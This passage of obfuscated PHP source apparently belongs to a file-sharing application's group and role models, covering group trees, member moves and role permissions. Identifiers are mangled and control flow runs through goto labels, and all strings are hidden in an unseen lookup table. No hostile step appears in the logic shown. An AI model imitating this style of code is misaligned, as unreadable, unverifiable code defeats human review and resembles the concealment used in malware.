$bøÏÙãæ›[$F®ƒ¤íĞŠ[373]][$F®ƒ¤íĞŠ[374]] = count($bøÏÙãæ›[$F®ƒ¤íĞŠ[376]]); goto FÉ¥¼êÛ’º; FÉ¥¼êÛ’º: $bøÏÙãæ›[$F®ƒ¤íĞŠ[373]][$F®ƒ¤íĞŠ[375]] = ceil($bøÏÙãæ›[$F®ƒ¤íĞŠ[373]][$F®ƒ¤íĞŠ[374]] / $bøÏÙãæ›[$F®ƒ¤íĞŠ[373]][$F®ƒ¤íĞŠ[370]]); goto aœ£®ÜÔ‡; aœ£®ÜÔ‡: } $this->_listDataApply($bøÏÙãæ›[$F®ƒ¤íĞŠ[376]]); goto d¥Äó¥œ©à; CÊ¸‘Ãèã—: $F®ƒ¤íĞŠ =& $_SERVER[£¶ä½¶¢]; $Bß˜ä†ç· = $DÖ•âÑ»[$F®ƒ¤íĞŠ[1773]]; $E£»è”ÜÕÁ = isset($DÖ•âÑ»[$F®ƒ¤íĞŠ[1774]]) ? $DÖ•âÑ»[$F®ƒ¤íĞŠ[1774]] : !1; goto BÌã˜†Ç; f¼È»óèæ: } protected function groupChildrenAll($Aî—–ÚÙ„) { $b˜¤‹š“÷Ğ =& $_SERVER[£¶ä½¶¢]; if (!$Aî—–ÚÙ„) { return !1; } if (is_string($Aî—–ÚÙ„)) { $Aî—–ÚÙ„ = array($Aî—–ÚÙ„); } $A¾¢ÓÅ” = $Aî—–ÚÙ„; foreach ($Aî—–ÚÙ„ as $a¯»ªİ‰©İ) { $CêÎÄ¡¹ĞŠ = $this->getInfoSimple($a¯»ªİ‰©İ); $F··ôÁŸà = array($b˜¤‹š“÷Ğ[495] => array($b˜¤‹š“÷Ğ[388], $CêÎÄ¡¹ĞŠ[$b˜¤‹š“÷Ğ[495]] . $a¯»ªİ‰©İ . $b˜¤‹š“÷Ğ[521])); $aÅŒçÆÜ¾ä = $this->field($b˜¤‹š“÷Ğ[1690])->where($F··ôÁŸà)->select(); $A¾¢ÓÅ” = array_merge($A¾¢ÓÅ”, array_to_keyvalue($aÅŒçÆÜ¾ä, $b˜¤‹š“÷Ğ[43], $b˜¤‹š“÷Ğ[1690])); } return array_unique($A¾¢ÓÅ”); } private function _searchFromMeta($D¥Î¢¶å²ö, $f½ë¢ËÍŠ, $b°ÕÒÀù«Ì, $e’ŒôÙíĞ¡) { goto Fñº¥‚åŒ°; aã‚†Éø¹Ä: $cºÌ´Ü ¿ğ = $this->parseWhereLike($cºÌ´Ü ¿ğ); if ($e’ŒôÙíĞ¡) { $cºÌ´Ü ¿ğ[$aîŠœÇ÷·Ì[1690]] = array($aîŠœÇ÷·Ì[17], $e’ŒôÙíĞ¡); } $dçÄ¡ùÙ•¦ = Model($aîŠœÇ÷·Ì[1778])->where($cºÌ´Ü ¿ğ)->limit($b°ÕÒÀù«Ì)->select(); goto FÎÙ±³ÊŒ›; Fñº¥‚åŒ°: $aîŠœÇ÷·Ì =& $_SERVER[£¶ä½¶¢]; $f½ë¢ËÍŠ = strtolower($f½ë¢ËÍŠ); $cºÌ´Ü ¿ğ = array($aîŠœÇ÷·Ì[103] => $D¥Î¢¶å²ö, $aîŠœÇ÷·Ì[381] => array($aîŠœÇ÷·Ì[388], "\45{$f½ë¢ËÍŠ}\x25")); goto aã‚†Éø¹Ä; F‘™ÏâãŠ±: if (!$FáõËŠ‡Å) { return array(); } return $FáõËŠ‡Å; goto CŸçÈå£é¨; FÎÙ±³ÊŒ›: if (!$dçÄ¡ùÙ•¦) { return array(); } $dçÄ¡ùÙ•¦ = array_to_keyvalue($dçÄ¡ùÙ•¦, $aîŠœÇ÷·Ì[43], $aîŠœÇ÷·Ì[1690]); $FáõËŠ‡Å = $this->where(array($aîŠœÇ÷·Ì[1768] => array($aîŠœÇ÷·Ì[17], $dçÄ¡ùÙ•¦)))->select(); goto F‘™ÏâãŠ±; CŸçÈå£é¨: } protected function _listDataApplyItem($fÛ¬ÒŠšŞ) { $e†¶’Šˆ½¸ = array($fÛ¬ÒŠšŞ); $this->_listDataApply($e†¶’Šˆ½¸); return $e†¶’Šˆ½¸[0]; } protected function _listDataApply(&$fÔÔÍìŒ) { goto Eì³˜“Î¤Ü; eé«ÓÂ–¢ˆ: $this->_listAppendChildren($fÔÔÍìŒ); $this->_listAppendChildrenMember($fÔÔÍìŒ); $this->_listAppendMeta($fÔÔÍìŒ, $F”ìªŒ÷–ƒ); goto B»…¦’İ; Eì³˜“Î¤Ü: $eæ•º×‘ =& $_SERVER[£¶ä½¶¢]; if (!$fÔÔÍìŒ) { return; } $F”ìªŒ÷–ƒ = array_to_keyvalue($fÔÔÍìŒ, $eæ•º×‘[43], $eæ•º×‘[1690]); goto eé«ÓÂ–¢ˆ; B»…¦’İ: $this->_listAppendParent($fÔÔÍìŒ); $this->_listAppendSourceRoot($fÔÔÍìŒ, $F”ìªŒ÷–ƒ); goto D³ñÎîóë; D³ñÎîóë: } private function _listAppendChildren(&$AÎ¿Ç¢‡µ) { goto A¡ÙÉã›–; d¾ƒ¦¬Ö§ù: foreach ($AÎ¿Ç¢‡µ as &$E›†¾×ô“Œ) { $fÏÄ¥Ì‡†¤ = $E›†¾×ô“Œ[$A³‡Ú†ä²ê[1690]]; $E›†¾×ô“Œ[$A³‡Ú†ä²ê[1780]] = isset($A¾‘‹å…Ó[$fÏÄ¥Ì‡†¤]) ? intval($A¾‘‹å…Ó[$fÏÄ¥Ì‡†¤]) : !1; } unset($E›†¾×ô“Œ); goto dëŞöºÕ¥; f¤÷ñŒåèÂ: $e¸ŠÊ„¹·½ = array($A³‡Ú†ä²ê[486], $A³‡Ú†ä²ê[1779] => $A³‡Ú†ä²ê[488]); $bª ³ÃæÜ = $this->field($e¸ŠÊ„¹·½)->where($EÀ¥·çÆ¯Ù)->group($A³‡Ú†ä²ê[486])->select(); $A¾‘‹å…Ó = array_to_keyvalue($bª ³ÃæÜ, $A³‡Ú†ä²ê[486], $A³‡Ú†ä²ê[488]); goto d¾ƒ¦¬Ö§ù; A¡ÙÉã›–: $A³‡Ú†ä²ê =& $_SERVER[£¶ä½¶¢]; $dàáÔ²‰Äß = array_to_keyvalue($AÎ¿Ç¢‡µ, $A³‡Ú†ä²ê[43], $A³‡Ú†ä²ê[1690]); $EÀ¥·çÆ¯Ù = array($A³‡Ú†ä²ê[486] => array($A³‡Ú†ä²ê[17], $dàáÔ²‰Äß)); goto f¤÷ñŒåèÂ; dëŞöºÕ¥: } private function _listAppendChildrenMember(&$då…Æ™‰õ„) { goto bÏğ‡ŸÓ¾Ÿ; bÏğ‡ŸÓ¾Ÿ: $Dø•äßĞ¡Í =& $_SERVER[£¶ä½¶¢]; $eÖ¾¥Şîš = array_to_keyvalue($då…Æ™‰õ„, $Dø•äßĞ¡Í[43], $Dø•äßĞ¡Í[1690]); $bª¶ñ÷šÀ = array($Dø•äßĞ¡Í[1690] => array($Dø•äßĞ¡Í[17], $eÖ¾¥Şîš)); goto aÖà™¾ªÛ; eäµâ©Ğ™: foreach ($då…Æ™‰õ„ as &$C²ÀÅà†³œ) { $Ağñë…¾¶¨ = $C²ÀÅà†³œ[$Dø•äßĞ¡Í[1690]]; $C²ÀÅà†³œ[$Dø•äßĞ¡Í[1781]] = isset($A¦Ïåİ¶øœ[$Ağñë…¾¶¨]) ? intval($A¦Ïåİ¶øœ[$Ağñë…¾¶¨]) : !1; } unset($C²ÀÅà†³œ); goto aİİ† áº„; aÖà™¾ªÛ: $EÑßÕ­¯ = array($Dø•äßĞ¡Í[1690], $Dø•äßĞ¡Í[1779] => $Dø•äßĞ¡Í[488]); $Eö¤ƒñ® = Model($Dø•äßĞ¡Í[1771])->field($EÑßÕ­¯)->where($bª¶ñ÷šÀ)->group($Dø•äßĞ¡Í[1690])->select(); $A¦Ïåİ¶øœ = array_to_keyvalue($Eö¤ƒñ®, $Dø•äßĞ¡Í[1690], $Dø•äßĞ¡Í[488]); goto eäµâ©Ğ™; aİİ† áº„: } private function _listAppendMeta(&$Aˆ‘¿é¼ò, $cãßÃÎÜ–ë) { goto eµâÇåñ; E—°²Œ„»±: $A¶²ÃÙóçÕ = array_to_keyvalue_group($A¶²ÃÙóçÕ, $CßÊÆ«İÊá[1690]); foreach ($A¶²ÃÙóçÕ as &$E¶ÂÜª…¡Æ) { $E¶ÂÜª…¡Æ = array_to_keyvalue($E¶ÂÜª…¡Æ, $CßÊÆ«İÊá[103], $CßÊÆ«İÊá[381]); } unset($E¶ÂÜª…¡Æ); goto e¯µèâ©…ì; eµâÇåñ: $CßÊÆ«İÊá =& $_SERVER[£¶ä½¶¢]; $C½¶·Û“ = array($CßÊÆ«İÊá[1690] => array($CßÊÆ«İÊá[17], $cãßÃÎÜ–ë)); $A¶²ÃÙóçÕ = Model($CßÊÆ«İÊá[1770])->where($C½¶·Û“)->select(); goto E—°²Œ„»±; e¯µèâ©…ì: foreach ($Aˆ‘¿é¼ò as &$aÑ°‡‰´Àï) { $aÑ°‡‰´Àï[$CßÊÆ«İÊá[453]] = array(); if (isset($A¶²ÃÙóçÕ[$aÑ°‡‰´Àï[$CßÊÆ«İÊá[1690]]])) { $aÑ°‡‰´Àï[$CßÊÆ«İÊá[453]] = $A¶²ÃÙóçÕ[$aÑ°‡‰´Àï[$CßÊÆ«İÊá[1690]]]; } } unset($aÑ°‡‰´Àï); goto Bé¶Ù„«Ü; Bé¶Ù„«Ü: } protected function parentLevelArray($E÷Ìàº‚·°) { $aóçôã™»ì =& $_SERVER[£¶ä½¶¢]; $E÷Ìàº‚·° = explode($aóçôã™»ì[57], trim($E÷Ìàº‚·°, $aóçôã™»ì[57])); $E÷Ìàº‚·° = array_remove_value($E÷Ìàº‚·°, $aóçôã™»ì[201]); return $E÷Ìàº‚·°; } private function _listAppendParent(&$cæ•Õ­ßÀ) { goto DÁäƒ‰…ß¨; C”‹âí¿™Â: if ($GLOBALS[$f¥ø™ÍÓ”ˆ[493]] == $f¥ø™ÍÓ”ˆ[97]) { $EÈ®ÌŠ”¨ = !1; } foreach ($cæ•Õ­ßÀ as &$f„Å·ä£À°) { $a§ößˆŠ³Ô = $this->parentLevelArray($f„Å·ä£À°[$f¥ø™ÍÓ”ˆ[495]]); $E†ê©Å™§ = $f¥ø™ÍÓ”ˆ[43]; foreach ($a§ößˆŠ³Ô as $B•¾®Û‰Íã => $c­ÓÛµŠš‚) { if ($EÈ®ÌŠ”¨ && $B•¾®Û‰Íã == 0) { continue; } $E†ê©Å™§ .= $fğ¬¢ö£’Ã[$c­ÓÛµŠš‚] . $f¥ø™ÍÓ”ˆ[18]; } if ($a§ößˆŠ³Ô) { $E†ê©Å™§ .= $f„Å·ä£À°[$f¥ø™ÍÓ”ˆ[38]]; } $f„Å·ä£À°[$f¥ø™ÍÓ”ˆ[499]] = str_replace($f¥ø™ÍÓ”ˆ[504], $f¥ø™ÍÓ”ˆ[18], $E†ê©Å™§); } unset($f„Å·ä£À°); goto Cï¡Â›÷’; B³İ·îÓÃ­: unset($f„Å·ä£À°); foreach ($fğ¬¢ö£’Ã as $B•¾®Û‰Íã => $D˜‹Ş‘¨‘Í) { if ($D˜‹Ş‘¨‘Í) { continue; } $cŸÓí˜›‰ = $this->getInfoSimple($B•¾®Û‰Íã); $fğ¬¢ö£’Ã[$B•¾®Û‰Íã] = $cŸÓí˜›‰[$f¥ø™ÍÓ”ˆ[38]]; } $EÈ®ÌŠ”¨ = $GLOBALS[$f¥ø™ÍÓ”ˆ[16]][$f¥ø™ÍÓ”ˆ[98]][$f¥ø™ÍÓ”ˆ[1782]]; goto C”‹âí¿™Â; DÁäƒ‰…ß¨: $f¥ø™ÍÓ”ˆ =& $_SERVER[£¶ä½¶¢]; $fğ¬¢ö£’Ã = array(); foreach ($cæ•Õ­ßÀ as &$f„Å·ä£À°) { $fğ¬¢ö£’Ã[$f„Å·ä£À°[$f¥ø™ÍÓ”ˆ[1690]]] = $f„Å·ä£À°[$f¥ø™ÍÓ”ˆ[38]]; $a§ößˆŠ³Ô = $this->parentLevelArray($f„Å·ä£À°[$f¥ø™ÍÓ”ˆ[495]]); foreach ($a§ößˆŠ³Ô as $c­ÓÛµŠš‚) { if (!isset($fğ¬¢ö£’Ã[$c­ÓÛµŠš‚])) { $fğ¬¢ö£’Ã[$c­ÓÛµŠš‚] = 0; } } } goto B³İ·îÓÃ­; Cï¡Â›÷’: } private function _listAppendSourceRoot(&$a·¶ºŞ†ê¾, $c›§Øğ‚Ï“) { goto aÎĞ¾Ç”Ø; b”óÂ°Í¡¬: $A©ù…Å› = Model($FÜ½£¥‡ÖÂ[798])->order($FÜ½£¥‡ÖÂ[1784])->field($dóš’‘¿­î)->where($f–‡ÑÁ—©â)->select(); $A©ù…Å› = array_to_keyvalue($A©ù…Å›, $FÜ½£¥‡ÖÂ[492]); $A©ù…Å› = array_remove_key($A©ù…Å›, $FÜ½£¥‡ÖÂ[492]); goto EÄö©î„Íä; EÄö©î„Íä: foreach ($a·¶ºŞ†ê¾ as &$FÑ©á÷‰ì) { $FÑ©á÷‰ì[$FÜ½£¥‡ÖÂ[95]] = $A©ù…Å›[$FÑ©á÷‰ì[$FÜ½£¥‡ÖÂ[1690]]] ? $A©ù…Å›[$FÑ©á÷‰ì[$FÜ½£¥‡ÖÂ[1690]]] : array(); } unset($FÑ©á÷‰ì); goto cª©–ïàøˆ; aÎĞ¾Ç”Ø: $FÜ½£¥‡ÖÂ =& $_SERVER[£¶ä½¶¢]; $f–‡ÑÁ—©â = array($FÜ½£¥‡ÖÂ[412] => SourceModel::TYPE_GROUP, $FÜ½£¥‡ÖÂ[486] => 0, $FÜ½£¥‡ÖÂ[492] => array($FÜ½£¥‡ÖÂ[17], $c›§Øğ‚Ï“)); $dóš’‘¿­î = $FÜ½£¥‡ÖÂ[1783]; goto b”óÂ°Í¡¬; cª©–ïàøˆ: } protected function groupMerge($e‚áŒä’ñ) { $e‚áŒä’ñ = array_values(array_unique($e‚áŒä’ñ)); $bƒèºÓÎÁò = array(); for ($cõöÁ¿Œá = 0; $cõöÁ¿Œá < count($e‚áŒä’ñ); $cõöÁ¿Œá++) { $F—ø£Áêã„ = !1; for ($bÔ„£ñôÛ¨ = 0; $bÔ„£ñôÛ¨ < count($e‚áŒä’ñ); $bÔ„£ñôÛ¨++) { if ($cõöÁ¿Œá == $bÔ„£ñôÛ¨) { continue; } if ($this->isParentOf($e‚áŒä’ñ[$bÔ„£ñôÛ¨], $e‚áŒä’ñ[$cõöÁ¿Œá])) { $F—ø£Áêã„ = !0; break; } } if (!$F—ø£Áêã„) { $bƒèºÓÎÁò[] = $e‚áŒä’ñ[$cõöÁ¿Œá]; } } return $bƒèºÓÎÁò; } protected function isParentOf($C©ä×ÜªäÛ, $CÒê¡´´ñ) { goto C½´æ¶’‡; C£Ğä¸àŸ¼: $a”é¢œÅªé = $this->getInfoSimple($CÒê¡´´ñ); $c²»‰°Ô’Ç = $d œ¸ì«Ù˜[$eİÂ†‚»”¬[495]] . $C©ä×ÜªäÛ . $eİÂ†‚»”¬[57]; if (substr($a”é¢œÅªé[$eİÂ†‚»”¬[495]], 0, strlen($c²»‰°Ô’Ç)) == $c²»‰°Ô’Ç) { return !0; } goto fÊ‘…òé„ô; C½´æ¶’‡: $eİÂ†‚»”¬ =& $_SERVER[£¶ä½¶¢]; if (!$C©ä×ÜªäÛ || !$CÒê¡´´ñ || $C©ä×ÜªäÛ == $CÒê¡´´ñ) { return !1; } $d œ¸ì«Ù˜ = $this->getInfoSimple($C©ä×ÜªäÛ); goto C£Ğä¸àŸ¼; fÊ‘…òé„ô: return !1; goto dù¾Ä“®–; dù¾Ä“®–: } public function groupShowRoot($a³»÷é“‘¤, $e­—òŸğ®È = false) { goto f¼ÉÌÓïçÍ; CªÕŠ°É–: return $eöÚÖØ¾±; goto A¬‡Á§—²; Eè¼åÃƒ¾ª: $cøø¦‚«Ã¾ = $this->parentLevelArray($fØã¡¨¶¸è[$dêÍÙÉµ™¦[495]]); $eöÚÖØ¾± = array($a³»÷é“‘¤); if (count($cøø¦‚«Ã¾) == 0) { return $eöÚÖØ¾±; } goto D“Å¥‚¤Ş¶; D“Å¥‚¤Ş¶: if ($e­—òŸğ®È && count($cøø¦‚«Ã¾) == 1) { return $eöÚÖØ¾±; } if (!$fØã¡¨¶¸è[$dêÍÙÉµ™¦[453]] || !isset($fØã¡¨¶¸è[$dêÍÙÉµ™¦[453]][$dêÍÙÉµ™¦[1766]]) || $fØã¡¨¶¸è[$dêÍÙÉµ™¦[453]][$dêÍÙÉµ™¦[1766]] == $dêÍÙÉµ™¦[1740]) { return $this->groupShowRoot($cøø¦‚«Ã¾[count($cøø¦‚«Ã¾) - 1], $e­—òŸğ®È); } if ($fØã¡¨¶¸è[$dêÍÙÉµ™¦[453]][$dêÍÙÉµ™¦[1766]] == $dêÍÙÉµ™¦[366]) { $CØµÒî§ÁŠ = explode($dêÍÙÉµ™¦[57], $fØã¡¨¶¸è[$dêÍÙÉµ™¦[453]][$dêÍÙÉµ™¦[1767]]); if ($CØµÒî§ÁŠ) { $eöÚÖØ¾± = array_merge($eöÚÖØ¾±, $CØµÒî§ÁŠ); } } goto CªÕŠ°É–; f¼ÉÌÓïçÍ: $dêÍÙÉµ™¦ =& $_SERVER[£¶ä½¶¢]; $fØã¡¨¶¸è = $this->getInfo($a³»÷é“‘¤); if (!$fØã¡¨¶¸è) { return array(); } goto Eè¼åÃƒ¾ª; A¬‡Á§—²: } protected function resetParentLevel() { $a‰…îÁ¥Û =& $_SERVER[£¶ä½¶¢]; $fµÁ‚†Èó = $a‰…îÁ¥Û[1690]; $CºÃÂ­İòÉ = $this->select(); $CºÃÂ­İòÉ = array_to_keyvalue($CºÃÂ­İòÉ, $fµÁ‚†Èó); foreach ($CºÃÂ­İòÉ as $e‹éŠµáˆ) { goto dñ¬œ”±ãï; a‹ëØÕ¶šµ: $this->where(array($fµÁ‚†Èó => $e‹éŠµáˆ[$fµÁ‚†Èó]))->save(array($a‰…îÁ¥Û[561] => $Fœ£ÅÂÀ”)); goto AñÃãæ¡É; dñ¬œ”±ãï: $dùÀšŠá­ù = $e‹éŠµáˆ; $Fœ£ÅÂÀ” = array(); while ($dùÀšŠá­ù[$a‰…îÁ¥Û[486]] != 0) { $Fœ£ÅÂÀ”[] = $dùÀšŠá­ù[$a‰…îÁ¥Û[486]]; $dùÀšŠá­ù = $CºÃÂ­İòÉ[$dùÀšŠá­ù[$a‰…îÁ¥Û[486]]]; } goto bÃËÏŒŸ„Š; bÃËÏŒŸ„Š: $Fœ£ÅÂÀ”[] = 0; $Fœ£ÅÂÀ” = $a‰…îÁ¥Û[57] . implode($a‰…îÁ¥Û[57], array_reverse($Fœ£ÅÂÀ”)) . $a‰…îÁ¥Û[57]; $this->setNamePinyin($e‹éŠµáˆ[$fµÁ‚†Èó], $e‹éŠµáˆ[$a‰…îÁ¥Û[38]]); goto a‹ëØÕ¶šµ; AñÃãæ¡É: } return $CºÃÂ­İòÉ; } public function groupNameAuto($Bïë¬âµ¢, $eœö¯»¼ÚÂ) { $EÅ‹´Û“° =& $_SERVER[£¶ä½¶¢]; $D×¤«š’ß = $this->where(array($EÅ‹´Û“°[402] => $Bïë¬âµ¢))->getField($EÅ‹´Û“°[38], !0); if (!$D×¤«š’ß || !in_array($eœö¯»¼ÚÂ, $D×¤«š’ß)) { return $eœö¯»¼ÚÂ; } for ($FåÚˆâÜÑ = 1; $FåÚˆâÜÑ <= count($D×¤«š’ß) + 1; $FåÚˆâÜÑ++) { $a‹ò¬·„ = $eœö¯»¼ÚÂ . "\50{$FåÚˆâÜÑ}\51"; if (!in_array($a‹ò¬·„, $D×¤«š’ß)) { return $a‹ò¬·„; } } } public function groupSwitch($F„Ìßâƒƒ›, $a†½„å«Ê•) { goto B·ç¢¤ò‹ø; c¦¶™«¹¢µ: $this->where(array($EßİêĞ­‡[486] => $F„Ìßâƒƒ›))->save(array($EßİêĞ­‡[486] => $a†½„å«Ê•)); return !0; goto dÀ” âôËŒ; B·ç¢¤ò‹ø: $EßİêĞ­‡ =& $_SERVER[£¶ä½¶¢]; $DïÀœï°É = array($EßİêĞ­‡[1690] => array($EßİêĞ­‡[17], array($F„Ìßâƒƒ›, $a†½„å«Ê•))); $cˆéææ¹£Ø = $this->where($DïÀœï°É)->select(); goto C¼ìàÃŒˆ¼; eÉÒÈ‹™: $dãŠğÆ¬£” = !empty($Dğ‰¸ÊÕÑĞ[$F„Ìßâƒƒ›]) ? $Dğ‰¸ÊÕÑĞ[$F„Ìßâƒƒ›] : !1; if ($dãŠğÆ¬£”) { goto E ½¥Œååñ; fã·Ãé”µî: $FäÍ†ÇÜ  = array($EßİêĞ­‡[492] => $a†½„å«Ê•); Model($EßİêĞ­‡[1788])->where($DïÀœï°É)->save($FäÍ†ÇÜ ); Model($EßİêĞ­‡[1789])->where($DïÀœï°É)->save($FäÍ†ÇÜ ); goto FùÎ‹Ş¨Î…; E ½¥Œååñ: if (!$Dğ‰¸ÊÕÑĞ[$a†½„å«Ê•]) { $Dğ‰¸ÊÕÑĞ[$a†½„å«Ê•] = Model($EßİêĞ­‡[798])->groupRootAdd($a†½„å«Ê•); } $BÈäøÜº¢… = $Dğ‰¸ÊÕÑĞ[$a†½„å«Ê•]; $DïÀœï°É = array($EßİêĞ­‡[486] => $dãŠğÆ¬£”); goto d±šÂÄ–Á; eã Óˆİğ: foreach ($Dğ‰¸ÊÕÑĞ as $cßè¿²ÁŒ¹) { $B¿äœöãœ = $cßè¿²ÁŒ¹[$EßİêĞ­‡[411]] == $EßİêĞ­‡[97] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($EßİêĞ­‡[798])->move($cßè¿²ÁŒ¹[$EßİêĞ­‡[403]], $BÈäøÜº¢…, $B¿äœöãœ); } Model($EßİêĞ­‡[798])->moveClearAuth = !0; $DïÀœï°É = array($EßİêĞ­‡[412] => 2, $EßİêĞ­‡[492] => $F„Ìßâƒƒ›); goto fã·Ãé”µî; d±šÂÄ–Á: $Dğ‰¸ÊÕÑĞ = Model($EßİêĞ­‡[798])->where($DïÀœï°É)->field($EßİêĞ­‡[1787])->select(); if (!$Dğ‰¸ÊÕÑĞ) { $Dğ‰¸ÊÕÑĞ = array(); } Model($EßİêĞ­‡[798])->moveClearAuth = !1; goto eã Óˆİğ; FùÎ‹Ş¨Î…: } $this->_changeChildLevel($cˆéææ¹£Ø[$F„Ìßâƒƒ›], $cˆéææ¹£Ø[$a†½„å«Ê•], !0); goto c¦¶™«¹¢µ; FË´“œ°çƒ: $DïÀœï°É = array($EßİêĞ­‡[412] => 2, $EßİêĞ­‡[486] => 0, $EßİêĞ­‡[411] => 1, $EßİêĞ­‡[492] => array($EßİêĞ­‡[17], array($F„Ìßâƒƒ›, $a†½„å«Ê•))); $Dğ‰¸ÊÕÑĞ = Model($EßİêĞ­‡[798])->where($DïÀœï°É)->field($EßİêĞ­‡[1786])->select(); $Dğ‰¸ÊÕÑĞ = array_to_keyvalue($Dğ‰¸ÊÕÑĞ, $EßİêĞ­‡[492], $EßİêĞ­‡[403]); goto eÉÒÈ‹™; C¼ìàÃŒˆ¼: $cˆéææ¹£Ø = array_to_keyvalue($cˆéææ¹£Ø, $EßİêĞ­‡[1690]); if (!isset($cˆéææ¹£Ø[$F„Ìßâƒƒ›]) || !isset($cˆéææ¹£Ø[$a†½„å«Ê•]) || $cˆéææ¹£Ø[$F„Ìßâƒƒ›][$EßİêĞ­‡[486]] == 0) { return !1; } $DïÀœï°É = array($EßİêĞ­‡[1690] => $F„Ìßâƒƒ›); goto dß…×°Â×Š; dß…×°Â×Š: $eÙì Èœ› = Model($EßİêĞ­‡[1771])->where($DïÀœï°É)->select(); if (!$eÙì Èœ›) { $eÙì Èœ› = array(); } foreach ($eÙì Èœ› as $d™ƒôÚ›) { $C«ë¬„ö = $d™ƒôÚ›[$EßİêĞ­‡[1526]]; $DïÀœï°É = array($EßİêĞ­‡[1526] => $C«ë¬„ö, $EßİêĞ­‡[1690] => $a†½„å«Ê•); $cÛ´Ôæµê… = Model($EßİêĞ­‡[1771])->where($DïÀœï°É)->find(); if (!$cÛ´Ôæµê…) { $fÒãšØ = array($a†½„å«Ê• => $d™ƒôÚ›[$EßİêĞ­‡[1785]]); Model($EßİêĞ­‡[514])->userGroupAdd($C«ë¬„ö, $fÒãšØ); } Model($EßİêĞ­‡[514])->userGroupRemove($C«ë¬„ö, $F„Ìßâƒƒ›); } goto FË´“œ°çƒ; dÀ” âôËŒ: } } goto BÌ­½àÈ°‚; bÒ©ÑáëîÅ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\56\162\x6f\x6c\x65\114\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\165\164\x68", "\x6c\141\142\x65\x6c", "\x64\x69\x73\x70\154\x61\171", "\163\x79\163\x74\x65\155", "\x64\x65\163\x63", "\x69\x67\x6e\x6f\162\145\x45\170\x74", "\151\147\156\157\x72\145\106\x69\x6c\145\123\151\172\145", "\x61\x64\155\x69\156\151\x73\164\x72\141\164\157\x72", "\x73\x6f\x72\x74"); public function listData($fò‹ŒÅÙµ¨ = false, $fÄóğßÁ¢ø = "\x73\157\x72\x74", $bÈÖØ‚‹è = false) { $d…ùŞâºÓ– =& $_SERVER[£¶ä½¶¢]; $C¨¬Åö‰´˜ = parent::listData($fò‹ŒÅÙµ¨, $fÄóğßÁ¢ø, $bÈÖØ‚‹è); if (!$fò‹ŒÅÙµ¨) { foreach ($C¨¬Åö‰´˜ as $D–´˜ÆÍİ÷ => $A·îÛœ±) { if ($A·îÛœ±[$d…ùŞâºÓ–[1879]] == 1) { $C¨¬Åö‰´˜[$D–´˜ÆÍİ÷][$d…ùŞâºÓ–[439]] = LNG($d…ùŞâºÓ–[2105]); } } } return $C¨¬Åö‰´˜; } public function update($E–ğÎÙ©îö, $DÛÑ†áË™¤) { goto A¼ŞøèÑÁ‡; A¼ŞøèÑÁ‡: $C‹…ò˜¯ó =& $_SERVER[£¶ä½¶¢]; $BÒ¿É˜ğ’ = parent::listData($E–ğÎÙ©îö); $a¯Ÿ‹äÚŞŒ = $this->findByName($DÛÑ†áË™¤[$C‹…ò˜¯ó[38]]); goto AÊÎ½”ó‰; AÊÎ½”ó‰: if (!$BÒ¿É˜ğ’ || $a¯Ÿ‹äÚŞŒ && $a¯Ÿ‹äÚŞŒ[$C‹…ò˜¯ó[401]] != $BÒ¿É˜ğ’[$C‹…ò˜¯ó[401]]) { return !1; } if ($a¯Ÿ‹äÚŞŒ[$C‹…ò˜¯ó[1879]] == 1) { $DÛÑ†áË™¤ = array($C‹…ò˜¯ó[38] => $DÛÑ†áË™¤[$C‹…ò˜¯ó[38]], $C‹…ò˜¯ó[1711] => $DÛÑ†áË™¤[$C‹…ò˜¯ó[1711]]); } $this->filterAuth($DÛÑ†áË™¤[$C‹…ò˜¯ó[414]]); goto aÖäÂ·ÑÓˆ; aÖäÂ·ÑÓˆ: return parent::update($E–ğÎÙ©îö, $DÛÑ†áË™¤); goto cÛ„¨ˆÜÚ™; cÛ„¨ˆÜÚ™: } public function remove($cİ«¬àÒ‚Ú) { $CŞªƒŸºøé = parent::listData($cİ«¬àÒ‚Ú); if (!$CŞªƒŸºøé || $CŞªƒŸºøé[$_SERVER[£¶ä½¶¢][1168]]) { return !1; } return parent::remove($cİ«¬àÒ‚Ú); } public function add($Cï¶ÌÍ½ƒì) { goto e„ÆšØ¿”Ë; e„ÆšØ¿”Ë: $EÃÂÙ¿‘Í =& $_SERVER[£¶ä½¶¢]; $Bì˜È×µì = $Cï¶ÌÍ½ƒì[$EÃÂÙ¿‘Í[38]]; if ($this->findByName($Bì˜È×µì)) { return !1; } goto D–Ö‰Ä†Â; dÒ½ Œƒïæ: return parent::insert($Cï¶ÌÍ½ƒì); goto C¹ÄÔÌ²ŸÎ; D–Ö‰Ä†Â: $DîØ‰É¾ï = array($EÃÂÙ¿‘Í[421] => $Bì˜È×µì, $EÃÂÙ¿‘Í[1696] => $EÃÂÙ¿‘Í[43], $EÃÂÙ¿‘Í[1692] => $EÃÂÙ¿‘Í[1700], $EÃÂÙ¿‘Í[2106] => 1, $EÃÂÙ¿‘Í[1695] => 0, $EÃÂÙ¿‘Í[2107] => 0, $EÃÂÙ¿‘Í[1694] => $this->getSort()); $Cï¶ÌÍ½ƒì = array_merge($DîØ‰É¾ï, $Cï¶ÌÍ½ƒì); $this->filterAuth($Cï¶ÌÍ½ƒì[$EÃÂÙ¿‘Í[414]]); goto dÒ½ Œƒïæ; C¹ÄÔÌ²ŸÎ: } private function getSort() { $cÚçˆÃó“¦ =& $_SERVER[£¶ä½¶¢]; $B°Ì ñ‹‰ª = parent::listData(); $d±šù×ùò = array_to_keyvalue($B°Ì ñ‹‰ª, $cÚçˆÃó“¦[43], $cÚçˆÃó“¦[1713]); return empty($d±šù×ùò) ? 0 : max($d±šù×ùò) + 1; } private function filterAuth(&$dÇµÅ±ÕÕÕ) { $F¦à˜­¢Ïˆ =& $_SERVER[£¶ä½¶¢]; $a”›–±ãšó = array(); $e‘†×—Ö = array_filter(explode($F¦à˜­¢Ïˆ[57], $dÇµÅ±ÕÕÕ)); foreach ($e‘†×—Ö as $dÇµÅ±ÕÕÕ) { $a•Ø¡­†¬ = explode($F¦à˜­¢Ïˆ[105], $dÇµÅ±ÕÕÕ); if ($a•Ø¡­†¬[0] == $F¦à˜­¢Ïˆ[2108] && $a•Ø¡­†¬[1] != $F¦à˜­¢Ïˆ[1088]) { $d‰ØÂ“İó = $a•Ø¡­†¬[0] . $F¦à˜­¢Ïˆ[105] . $a•Ø¡­†¬[1] . 